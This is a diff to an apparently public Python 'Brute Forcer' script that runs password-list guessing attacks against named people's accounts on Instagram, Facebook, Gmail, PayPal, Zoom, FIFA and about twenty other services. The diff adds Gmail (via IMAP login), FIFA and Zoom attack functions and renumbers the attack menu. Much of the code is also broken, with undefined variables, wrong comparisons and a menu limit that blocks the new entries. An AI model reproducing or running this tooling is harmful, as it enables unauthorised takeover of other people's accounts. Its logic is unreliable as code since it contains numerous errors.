@@ -1,6 +1,6 @@
 """
 Author: @new92
-Brute Forcer: Program for Brute Forcing Accounts from Websites
+Brute Forcer: Program for Brute Forcing Instagram Accounts
 Please do not use it for illegal purposes !
 The author is not responsible for any illegal activity/activities carried out using this program !!
 The author's not responsible for any damages may be caused in the given account(s).
@@ -29,6 +29,7 @@ try:
     import re
     import scrapy
     import selenium
+    import imaplib
     from os import system
     from selenium import webdriver
     from selenium.webdriver.support.ui import WebDriverWait
@@ -67,29 +68,32 @@ def AvailAttacks():
     print("[1] Instagram")
     print("[2] Facebook")
     print("[3] Messenger")
-    print("[4] Reddit")
-    print("[5] TikTok")
-    print("[6] Netflix")
-    print("[7] Pinterest")
-    print("[8] LinkedIn")
-    print("[9] Paypal")
-    print("[10] Snapchat")
-    print("[11] Spotify")
-    print("[12] Twitch")
-    print("[13] Steam")
-    print("[14] Badoo")
-    print("[15] Crypto")
-    print("[16] DropBox")
-    print("[17] Oracle")
-    print("[18] StackOverFlow")
-    print("[19] IG Followers")
-    print("[20] Pornhub")
-    print("[21] Xhamster")
+    print("[4] Gmail")
+    print("[5] Reddit")
+    print("[6] TikTok")
+    print("[7] Netflix")
+    print("[8] Pinterest")
+    print("[9] LinkedIn")
+    print("[10] Paypal")
+    print("[11] Snapchat")
+    print("[12] Spotify")
+    print("[13] Twitch")
+    print("[14] Steam")
+    print("[15] Badoo")
+    print("[16] Crypto")
+    print("[17] DropBox")
+    print("[18] Oracle")
+    print("[19] StackOverFlow")
+    print("[20] IG Followers")
+    print("[21] FIFA")
+    print("[22] Zoom")
+    print("[23] Pornhub")
+    print("[24] Xhamster")
 
 #Instagram
 def Instagram():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Instagram")
+    print("[+] Preparing Brute Force Attack for Instagram...")
     time.sleep(2)
     username=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -98,6 +102,7 @@ def Instagram():
         print("[!] Invalid Username !")
         time.sleep(1)
         username=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     username = username.lower()
     username = username.strip()
     client=instagrapi.Client()
@@ -137,7 +142,7 @@ def Instagram():
 #Facebook
 def Facebook():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Facebook...")
+    print("[+] Preparing Brute Force Attack for Facebook...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -146,6 +151,7 @@ def Facebook():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -190,7 +196,7 @@ def Facebook():
 #Messenger
 def Messenger():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Messenger...")
+    print("[+] Preparing Brute Force Attack for Messenger...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -199,6 +205,7 @@ def Messenger():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -240,10 +247,60 @@ def Messenger():
             continue
         else:
             continue
+
+#Gmail
+def Gmail():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Gmail...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
+    email = email.lower()
+    email = email.strip()
+    server = "imap.gmail.com"
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            passworde = content
+            try:
+                log = imaplib.IMAP4_SSL(server)
+                login == log.login(email,passworde)
+            except Exception as e:
+                continue
+            if login == True:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if passworde not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
 #Reddit
 def Reddit():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Reddit...")
+    print("[+] Preparing Brute Force Attack for Reddit...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -252,6 +309,7 @@ def Reddit():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -297,7 +355,7 @@ def Reddit():
 #TikTok
 def TikTok():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for TikTok...")
+    print("[+] Preparing Brute Force Attack for TikTok...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -306,6 +364,7 @@ def TikTok():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -351,7 +410,7 @@ def TikTok():
 #Netflix
 def Netflix():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Netflix...")
+    print("[+] Preparing Brute Force Attack for Netflix...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -360,6 +419,7 @@ def Netflix():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -405,7 +465,7 @@ def Netflix():
 #Pinterest
 def Pinterest():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Pinterest...")
+    print("[+] Preparing Brute Force Attack for Pinterest...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -414,6 +474,7 @@ def Pinterest():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -459,7 +520,7 @@ def Pinterest():
 #LinkedIn
 def LinkedIn():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for LinkedIn...")
+    print("[+] Preparing Brute Force Attack for LinkedIn...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -468,6 +529,7 @@ def LinkedIn():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -513,7 +575,7 @@ def LinkedIn():
 #Paypal
 def Paypal():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Paypal...")
+    print("[+] Preparing Brute Force Attack for Paypal...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -522,6 +584,7 @@ def Paypal():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -567,7 +630,7 @@ def Paypal():
 #Snapchat
 def Snapchat():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Snapchat...")
+    print("[+] Preparing Brute Force Attack for Snapchat...")
     time.sleep(2)
     umail=input("[::] Please enter the Email or the Username: ")
     time.sleep(1)
@@ -576,6 +639,7 @@ def Snapchat():
         print("[!] Invalid Email or Username !")
         time.sleep(1)
         umail=input("[::] Please enter again the Email or the Username: ")
+    print("[!] Initiating Attack !")
     umail = umail.lower()
     umail = umail.strip()
     browser = webdriver.Firefox()
@@ -621,7 +685,7 @@ def Snapchat():
 #Spotify
 def Spotify():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Snapchat...")
+    print("[+] Preparing Brute Force Attack for Spotify...")
     time.sleep(2)
     umail=input("[::] Please enter the Email or the Username: ")
     time.sleep(1)
@@ -630,6 +694,7 @@ def Spotify():
         print("[!] Invalid Email or Username !")
         time.sleep(1)
         umail=input("[::] Please enter again the Email or the Username: ")
+    print("[!] Initiating Attack !")
     umail = umail.lower()
     umail = umail.strip()
     browser = webdriver.Firefox()
@@ -675,7 +740,7 @@ def Spotify():
 #Twitch
 def Twitch():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Twitch...")
+    print("[+] Preparing Brute Force Attack for Twitch...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -684,6 +749,7 @@ def Twitch():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -729,7 +795,7 @@ def Twitch():
 #Steam
 def Steam():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Steam...")
+    print("[+] Preparing Brute Force Attack for Steam...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -738,6 +804,7 @@ def Steam():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -783,7 +850,7 @@ def Steam():
 #Badoo
 def Badoo():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Badoo...")
+    print("[+] Preparing Brute Force Attack for Badoo...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -792,6 +859,7 @@ def Badoo():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -837,7 +905,7 @@ def Badoo():
 #Crypto
 def Crypto():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Crypto...")
+    print("[+] Preparing Brute Force Attack for Crypto...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -846,6 +914,7 @@ def Crypto():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -891,7 +960,7 @@ def Crypto():
 #DropBox
 def DropBox():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for DropBox...")
+    print("[+] Preparing Brute Force Attack for DropBox...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -900,6 +969,7 @@ def DropBox():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -945,7 +1015,7 @@ def DropBox():
 #Oracle
 def Oracle():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Oracle...")
+    print("[+] Preparing Brute Force Attack for Oracle...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -954,6 +1024,7 @@ def Oracle():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -999,7 +1070,7 @@ def Oracle():
 #Stackoverflow
 def StackOverFlow():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Stackoverflow...")
+    print("[+] Preparing Brute Force Attack for Stackoverflow...")
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
@@ -1008,6 +1079,7 @@ def StackOverFlow():
         print("[!] Invalid Email !")
         time.sleep(1)
         email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
     email = email.lower()
     email = email.strip()
     browser = webdriver.Firefox()
@@ -1053,7 +1125,7 @@ def StackOverFlow():
 #IG Followers
 def IGF():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for IG Followers...")
+    print("[+] Preparing Brute Force Attack for IG Followers...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -1062,6 +1134,7 @@ def IGF():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -1069,6 +1142,115 @@ def IGF():
     username = browser.find_element_by_id("username")
     password = browser.find_element_by_name("password")
     login = browser.find_element_by_id("login_insta")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(usname)
+                password.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#FIFA
+def FIFA():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for FIFA...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or len(email) > 30 or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        usname=input("[::] Please enter again the Email: ")
+    usname = usname.lower()
+    usname = usname.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://account.fifa.com/5a7baeb7-e706-4830-ad9f-103eba126311/oauth2/v2.0/authorize?p=b2c_1a_fifa_signuporsignin&client_id=adfd65b0-8026-4baa-ac21-db631c2139ec&response_type=code&redirect_uri=https%3A%2F%2Fwww.fifa.com%2Fapi%2Fauth&scope=adfd65b0-8026-4baa-ac21-db631c2139ec&prompt=login&response_mode=form_post&state=&ui_locales=en")
+    username = browser.find_element_by_id("signInName")
+    password = browser.find_element_by_id("password")
+    login = browser.find_element_by_id("next")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(email)
+                password.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Zoom
+def Zoom():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Zoom...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or len(email) > 30 or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        usname=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
+    usname = usname.lower()
+    usname = usname.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://zoom.us/signin")
+    username = browser.find_element_by_id("email")
+    password = browser.find_element_by_id("password")
+    login = browser.find_element_by_class_name("btn btn-primary signin user")
     login.click()
     Found = False
     for i in range(16):
@@ -1107,7 +1289,7 @@ def IGF():
 #Pornhub
 def Pornhub():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Pornhub...")
+    print("[+] Preparing Brute Force Attack for Pornhub...")
     time.sleep(2)
     usname=input("[::] Please enter the Username: ")
     time.sleep(1)
@@ -1116,6 +1298,7 @@ def Pornhub():
         print("[!] Invalid Username !")
         time.sleep(1)
         usname=input("[::] Please enter again the Username: ")
+    print("[!] Initiating Attack !")
     usname = usname.lower()
     usname = usname.strip()
     browser = webdriver.Firefox()
@@ -1161,7 +1344,7 @@ def Pornhub():
 #Xhamster
 def Xhamster():
     time.sleep(1)
-    print("[+] Initiating Brute Force Attack for Xhamster...")
+    print("[+] Preparing Brute Force Attack for Xhamster...")
     time.sleep(2)
     umail=input("[::] Please enter the Username or the Email: ")
     time.sleep(1)
@@ -1170,6 +1353,7 @@ def Xhamster():
         print("[!] Invalid Username or Email !")
         time.sleep(1)
         umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
     umail = umail.lower()
     umail = umail.strip()
     browser = webdriver.Firefox()
@@ -1235,6 +1419,7 @@ if option == "01" or option == "1":
     time.sleep(3)
     print("\n")
     attack = int(input("[::] Please enter the number of the attack: "))
+    time.sleep(1)
     while attack <= 0 or attack > 20:
         print("[!] Invalid Attack !")
         time.sleep(1)
@@ -1246,40 +1431,46 @@ if option == "01" or option == "1":
     elif attack == 3:
         Messenger()
     elif attack == 4:
-        Reddit()
+        Gmail()
     elif attack == 5:
-        TikTok()
+        Reddit()
     elif attack == 6:
-        Netflix()
+        TikTok()
     elif attack == 7:
-        Pinterest()
+        Netflix()
     elif attack == 8:
-        LinkedIn()
+        Pinterest()
     elif attack == 9:
-        Paypal()
+        LinkedIn()
     elif attack == 10:
-        Snapchat()
+        Paypal()
     elif attack == 11:
-        Spotify()
+        Snapchat()
     elif attack == 12:
-        Twitch()
+        Spotify()
     elif attack == 13:
-        Steam()
+        Twitch()
     elif attack == 14:
-        Badoo()
+        Steam()
     elif attack == 15:
-        Crypto()
+        Badoo()
     elif attack == 16:
-        DropBox()
+        Crypto()
     elif attack== 17:
-        Oracle()
+        DropBox()
     elif attack == 18:
-        StackOverFlow()
+        Oracle()
     elif attack == 19:
-        IGF()
+        StackOverFlow()
     elif attack == 20:
-        Pornhub()
+        IGF()
     elif attack == 21:
+        FIFA()
+    elif attack == 22:
+        Zoom()
+    elif attack == 23:
+        Pornhub()
+    elif attack == 24:
         Xhamster()
 else:
     print("Exiting...")
